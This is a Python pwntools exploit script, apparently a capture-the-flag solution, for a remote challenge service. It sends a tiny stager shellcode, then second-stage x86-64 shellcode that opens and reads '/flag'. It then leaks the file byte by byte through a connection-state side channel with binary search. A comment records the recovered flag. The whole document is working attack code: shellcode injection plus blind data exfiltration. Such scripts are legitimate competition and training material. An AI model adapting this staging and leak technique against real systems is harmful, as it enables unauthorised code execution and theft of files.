from pwn import *
from math import ceil
from time import sleep

flag = ""

firstSc = """
mov esi,edx
xor edi,edi
syscall
"""
firstSc = asm(firstSc)

i = 4
# n1c3_sh3llc0ding_d6e25f87c7ebeef6e80df23d32c42d00}
while "}" not in flag:
    # binary search
    top = ord("~")
    bot = ord(" ")
    mid = int(ceil((top-bot)/2)) + bot

    while True:
        #io = process("./chall",aslr=False)
        io = remote("win.the.seetf.sg",2002)
        context.arch = "amd64"
        #gdb.attach(io,gdbscript="break *0x00005555555553ba")
        
        
        io.sendafter("You've got 6 bytes, make them count!",firstSc)
        
        secondSc = """
        mov rdi,0x1337000
        xor rsi,rsi
        mov rax,2
        syscall
        
        mov rdi,rax
        mov rsi,0x1337900
        mov rdx,0x50
        mov rax,0
        syscall
        """
        
        secondSc += "mov dl,BYTE PTR[rsi+" + str(i) + "]"
        secondSc += """
        mov rdi,0
        mov rax,0
        syscall
        
        mov dl,1
        mov rdi,0
        mov rax,0
        syscall
        """
        
        # TODO RMB TO CHANGE THIS WHEN TRY REMOTE
        secondSc = b"/flag\x00" + asm(secondSc)
        io.sendline(secondSc)

        sleep(0.2)
        io.send(b"A"*mid)
        sleep(0.2)
        # needed to find a way to detect if the connection was still established
        # and io.interactive could detect it
        # so I just copied from https://github.com/Gallopsled/pwntools/blob/c72886a9b9/pwnlib/tubes/tube.py#L862-L916
        # tried like send_raw and connected_raw but those didnt work for me


        # io.interactive() etc works for remote() cause

        # remote()
        # The returned object supports all the methods from pwnlib.tubes.sock and pwnlib.tubes.tube.

        try:
            io.recv(timeout=0.05)
            cur = io.recv(timeout=0.05)

            bot = mid
            mid = int(ceil((top-bot)/2)) + bot 

        except EOFError:
            top = mid
            mid = int(ceil((top-bot)/2)) + bot
 
        
        if top-bot == 1:
            flag += chr(bot)
            break


    print(flag)
    i += 1

